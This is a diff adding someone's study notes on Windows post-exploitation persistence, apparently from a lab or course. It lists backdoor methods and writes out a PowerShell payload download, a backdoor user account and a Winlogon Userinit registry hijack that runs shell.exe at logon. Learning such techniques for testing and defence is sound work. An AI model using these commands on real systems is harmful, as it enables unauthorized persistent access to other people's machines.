@@ -1,3 +1,42 @@
 ------------------
 NOTES
 ------------------
+Persistence - post exploitation to keep access
+
+two types
+	Low priv
+		persistence under normal user
+			maybe stealthier?
+			if there is a exposed path to root, not a bad idea
+	privileged user
+		priv esc and install persistence
+
+keeping persistence
+	startup folder
+	editing registry keys
+	using scheduled tasks
+	using BITS
+	backdoored service
+	creating another user
+	backdooring RDP
+
+Transfer the file by hosting a python server and using the powershell command
+	Invoke-WebRequest http://ip:port/path -Outfile filename
+
+-----------------
+Startup Folder Persistence
+-----------------
+Do later, machine is continually dying, not fun
+
+
+
+
+High level
+
+add user balls:balls
+
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, <PATH_TO_BINARY>" /f
+
+when a user logs in as balls, will execute shell.exe
+
+
